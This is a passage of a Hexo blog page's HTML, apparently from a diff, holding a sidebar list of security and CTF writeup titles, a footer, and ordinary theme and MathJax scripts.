class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
